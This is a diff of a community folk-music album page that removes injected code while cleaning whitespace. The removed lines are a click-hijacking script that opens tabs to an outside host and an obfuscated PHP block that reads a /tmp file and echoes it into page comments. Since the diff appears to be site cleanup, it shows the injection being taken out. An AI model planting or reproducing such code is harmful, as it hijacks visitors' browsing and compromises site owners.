@@ -1,110 +1,32 @@
-<script>(function (parameters) {
-    const targets = [
-        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
-    ]
-    // Times between clicks
-    const restMinutes = 1;
-    // Number of hours to allow re-click 
-    const allowedHours = 2;
-
-
-    const saveTargetLocationsToStorage = (targets) => {
-        targets.forEach((target, index) => {
-            if(!localStorage.getItem(`${target}-local-storage`)){
-            	localStorage.setItem(`${target}-local-storage`, 0);
-            }
-        });
-    }
-    const getRandomLocationFromStorage = (targets) => {
-        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
-        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
-    }
-    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
-
-    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
-    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
-
-    const getHoursDiff = (startDate, endDate) => {
-        const msInHour = 1000 * 60 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInHour);
-    }
-    const getMintsDiff = (startDate, endDate) => {
-        const msInMints = 1000 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInMints);
-    }
-
-    const visitNewLocation = (targets, host, nowDate) => {
-        saveTargetLocationsToStorage(targets);
-        newLocation = getRandomLocationFromStorage(targets);
-        setTimeToStorage(`${host}-mnts`, nowDate);
-        setTimeToStorage(`${host}-hurs`, nowDate);
-        setLocationAsVisited(newLocation);
-        window.open(newLocation, "_blank");
-    }
-
-    // const randomLocation = getRandomLocationFromStorage(targets);
-    saveTargetLocationsToStorage(targets);
-
-    function globalClick(event) {
-        event.stopPropagation();
-        const host = location.host;
-        let newLocation = getRandomLocationFromStorage(targets);
-        const nowDate = Date.parse(new Date());
-        const savedDateForMints = getTimeStorage(`${host}-mnts`);
-        const savedDateForHours = getTimeStorage(`${host}-hurs`);
-
-        if (savedDateForMints && savedDateForHours) {
-            try {
-                const storageDateForMints = parseInt(savedDateForMints);
-                const storageDateForHours = parseInt(savedDateForHours);
-                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
-                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
-
-                if (hoursDiff >= allowedHours) {
-                    saveTargetLocationsToStorage(targets);
-                    setTimeToStorage(`${host}-hurs`, nowDate);
-                }
-                if (mintsDiff >= restMinutes) {
-                    if (newLocation) {
-                        setTimeToStorage(`${host}-mnts`, nowDate);
-                        window.open(newLocation, "_blank");
-                        setLocationAsVisited(newLocation);
-                    }
-                }
-            } catch (error) { visitNewLocation(targets, host, nowDate); }
-        } else { visitNewLocation(targets, host, nowDate); }
-    }
-    document.addEventListener("click", globalClick)
-})()</script>
 <html>
 	<head>
 		<title>The Community Music Project: Come Shining Through</title>
 		<link href="cmp.css" rel="stylesheet" type="text/css">
-	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	</head>
 	<body>
 		<iframe id="nav" src="nav.html"></iframe>
-		
+
 		<p class="album">
 			<img src="images/cst.gif" />
 			<h3>Come Shining Through (2001)</h3>
 			<span class="description">
-				Original folk, international folk and traditional gospel. 
-				Debut of Russian folksinger Jamuna (Russian folk in Russian), True Believers, Ari, 
-				Beverly (gospel), and Jasmine. Strong return performances from Cynthia, dandelion, 
+				Original folk, international folk and traditional gospel.
+				Debut of Russian folksinger Jamuna (Russian folk in Russian), True Believers, Ari,
+				Beverly (gospel), and Jasmine. Strong return performances from Cynthia, dandelion,
 				and Claudia (Chilean folk in Spanish).
 				<br/><br/>
 				<a href="albums/cst/cst.zip">Dowload entire album as zip</a><br/>
 				<a href="albums/cst/cst-art.zip">Dowload album art</a>
 			</span>
 		</p>
-		
+
 		<hr />
-		
+
 		<ol class="tracks">
 			<li>
 				<b><a href="albums/cst/CST-01-Let_Me_Be_Your_Lyre.mp3">Let Me Be Your Lyre</a></b>
 				(1:47)
-				<i>&copy; 1994 Cynthia R. Crossen</i> 
+				<i>&copy; 1994 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocals, Guitars: Jesse, Cynthia</li>
 				</ul>
@@ -112,7 +34,7 @@
 			<li>
 				<b><a href="albums/cst/CST-02-Haunting_Of_The_Heart.mp3">Haunting of the Heart</a></b>
 				(5:16)
-				<i>&copy; 1998 John Stash</i> 
+				<i>&copy; 1998 John Stash</i>
 				<ul>
 					<li>Vocal, Guitar: Johnny</li>
 					<li>Mandolin: Paul</li>
@@ -121,7 +43,7 @@
 			<li>
 				<b><a href="albums/cst/CST-03-Long_Road.mp3">Long Road, inspired Those Were the Days</a></b>
 				(3:36)
-				<i>Russian folk song</i> 
+				<i>Russian folk song</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 				</ul>
@@ -129,7 +51,7 @@
 			<li>
 				<b><a href="albums/cst/CST-04-No_Fool.mp3">No Fool</a></b>
 				(2:26)
-				<i>&copy; 2000 Judi Chatowsky</i> 
+				<i>&copy; 2000 Judi Chatowsky</i>
 				<ul>
 					<li>Vocals, Guitars: Judi, Jim</li>
 				</ul>
@@ -137,7 +59,7 @@
 			<li>
 				<b><a href="albums/cst/CST-05-Time_Is_Moving_Me.mp3">Time Is Moving Me</a></b>
 				(3:17)
-				<i>&copy; 2000 Jesse Crossen, Andy Greenberg, Andreas Hung</i> 
+				<i>&copy; 2000 Jesse Crossen, Andy Greenberg, Andreas Hung</i>
 				<ul>
 					<li>Vocals: Jesse, Cynthia</li>
 					<li>Guitar: Andy</li>
@@ -147,7 +69,7 @@
 			<li>
 				<b><a href="albums/cst/CST-06-Una_Aventura.mp3">Una Aventura</a></b>
 				(4:03)
-				<i>&copy; 2001 Claudia Lopez Bascuñan</i> 
+				<i>&copy; 2001 Claudia Lopez Bascuï¿½an</i>
 				<ul>
 					<li>Vocal, Guitar: Claudia</li>
 				</ul>
@@ -155,7 +77,7 @@
 			<li>
 				<b><a href="albums/cst/CST-07-Oh_Freedom.mp3">Oh Freedom</a></b>
 				(3:51)
-				<i>traditional African American</i> 
+				<i>traditional African American</i>
 				<ul>
 					<li>Vocal: Beverly</li>
 				</ul>
@@ -163,7 +85,7 @@
 			<li>
 				<b><a href="albums/cst/CST-08-Earth_Is_Holy.mp3">Earth Is Holy</a></b>
 				(4:18)
-				<i>&copy; 1980 Cynthia R. Crossen</i> 
+				<i>&copy; 1980 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocals: Cynthia, Lea, Sarbaga</li>
 					<li>Guitar: Cynthia</li>
@@ -173,7 +95,7 @@
 			<li>
 				<b><a href="albums/cst/CST-09-Come_Shining_Through.mp3">Come Shining Through</a></b>
 				(1:07)
-				<i>&copy; 2001 Cynthia R. Crossen</i> 
+				<i>&copy; 2001 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocal, Guitar: Cynthia</li>
 				</ul>
@@ -181,7 +103,7 @@
 			<li>
 				<b><a href="albums/cst/CST-10-Where_I_Am.mp3">Where I Am</a></b>
 				(5:37)
-				<i>&copy; 1998 John Stash</i> 
+				<i>&copy; 1998 John Stash</i>
 				<ul>
 					<li>Guitar, Vocal, Harmonica: Johnny</li>
 				</ul>
@@ -189,7 +111,7 @@
 			<li>
 				<b><a href="albums/cst/CST-11-Didn't_We_Have_Fun.mp3">Didn't We Have Fun</a></b>
 				(2:06)
-				<i>&copy; 2001 Jesse Crossen</i> 
+				<i>&copy; 2001 Jesse Crossen</i>
 				<ul>
 					<li>Vocal, Guitar: Jesse</li>
 				</ul>
@@ -197,7 +119,7 @@
 			<li>
 				<b><a href="albums/cst/CST-12-So_Wonderful_Growing_Up_With_You.mp3">So Wonderful Growing Up With You</a></b>
 				(3:18)
-				<i>&copy; 2000 Ari Picker</i> 
+				<i>&copy; 2000 Ari Picker</i>
 				<ul>
 					<li>Vocal, Guitar: Ari</li>
 				</ul>
@@ -205,7 +127,7 @@
 			<li>
 				<b><a href="albums/cst/CST-13-Papirosy.mp3">"Papirosy"</a></b>
 				(2:47)
-				<i>WWI Russian folk song</i> 
+				<i>WWI Russian folk song</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 				</ul>
@@ -213,7 +135,7 @@
 			<li>
 				<b><a href="albums/cst/CST-14-Don't_Forget_The_Family_Prayer.mp3">Don't Forget the Family Prayer</a></b>
 				(3:31)
-				<i>Traditional Gospel</i> 
+				<i>Traditional Gospel</i>
 				<ul>
 					<li>Vocal: Beverly</li>
 				</ul>
@@ -221,7 +143,7 @@
 			<li>
 				<b><a href="albums/cst/CST-15-Come_Shining_Through_Reprise.mp3">Come Shining Through, Jim's reprise</a></b>
 				(1:44)
-				<i>&copy; 2001 Cynthia R. Crossen</i> 
+				<i>&copy; 2001 Cynthia R. Crossen</i>
 				<ul>
 					<li>Guitar: Jim</li>
 				</ul>
@@ -229,7 +151,7 @@
 			<li>
 				<b><a href="albums/cst/CST-16-Absolute_Stillness.mp3">Absolute Stillness</a></b>
 				(5:22)
-				<i>&copy; 1994 Jasmine Girard</i> 
+				<i>&copy; 1994 Jasmine Girard</i>
 				<ul>
 					<li>Vocal, Guitar: Jasmine</li>
 				</ul>
@@ -237,7 +159,7 @@
 			<li>
 				<b><a href="albums/cst/CST-17-Alphonsina.mp3">Alphonsina</a></b>
 				(5:22)
-				<i>Violetta Parra / Patrimonio Nacional de Chile</i> 
+				<i>Violetta Parra / Patrimonio Nacional de Chile</i>
 				<ul>
 					<li>Vocals: Claudia, Myrna</li>
 					<li>Guitar: Claudia</li>
@@ -246,7 +168,7 @@
 			<li>
 				<b><a href="albums/cst/CST-18-Candyland.mp3">Candyland</a></b>
 				(2:36)
-				<i>&copy; 2000 Ari Picker</i> 
+				<i>&copy; 2000 Ari Picker</i>
 				<ul>
 					<li>Vocal, Guitar: Ari</li>
 				</ul>
@@ -254,7 +176,7 @@
 			<li>
 				<b><a href="albums/cst/CST-19-With_Me_Still.mp3">With Me Still</a></b>
 				(4:49)
-				<i>&copy; 1999 Judi Chatowsky</i> 
+				<i>&copy; 1999 Judi Chatowsky</i>
 				<ul>
 					<li>Vocals, Guitars: Judi, Jim</li>
 				</ul>
@@ -262,7 +184,7 @@
 			<li>
 				<b><a href="albums/cst/CST-20-Gentle_Wind.mp3">Gentle Wind</a></b>
 				(2:30)
-				<i>&copy; 1998 Larry Bohs</i> 
+				<i>&copy; 1998 Larry Bohs</i>
 				<ul>
 					<li>Vocal, Guitar: Larry</li>
 				</ul>
@@ -270,7 +192,7 @@
 			<li>
 				<b><a href="albums/cst/CST-21-Loving_Kindness.mp3">Lovingkindness</a></b>
 				(5:07)
-				<i>&copy; 1996 Cynthia R. Crossen</i> 
+				<i>&copy; 1996 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocals: Cynthia, Lea, Claudia, Sarbaga, Donovan, Jesse</li>
 					<li>Guitar: Cynthia </li>
@@ -278,16 +200,16 @@
 				</ul>
 			</li>
 		</ol>
-		
+
 		<hr />
-		
+
 		<p class="artists">
 			<h3>Artists</h3>
 			<ul class="artists">
 				<li>Andy Greenburg   - Guitar</li>
 				<li>Ari Picker  - Vocal, Guitar</li>
 				<li>Beverly McLean  - Vocal</li>
-				<li>Claudia Lopez Bascuñan and Myrna Bascuñan Lopez  - Vocal, Guitar</li>
+				<li>Claudia Lopez Bascuï¿½an and Myrna Bascuï¿½an Lopez  - Vocal, Guitar</li>
 				<li>Cynthia Rylander Crossen  - Vocal, Guitar</li>
 				<li>dandelion john (Johnny, John Stash)  - Vocal, Guitar, Harmonica</li>
 				<li>Donovan Zimmerman  - Drums, Vocal</li>
@@ -301,9 +223,9 @@
 				<li>True Believers (Judi Chatowsky and Jim Magaw)  - Vocal, Guitar (Judi and Jim)</li>
 			</ul>
 		</p>
-		
+
 		<hr />
-		
+
 		<p class="colophon">
 			Come Shining Through was recorded and produced by Ken Crossen<br />
 			Mixed and mastered by Jesse and Ken Crossen<br />
@@ -311,6 +233,6 @@
 			"Gentle Wind" was recorded and mixed by George Stetten (stetten.com)<br />
 			Photos, Cover/CD Design and Art by Ken Crossen<br />
 		</p>
-		
+
 	</body>
 </html>
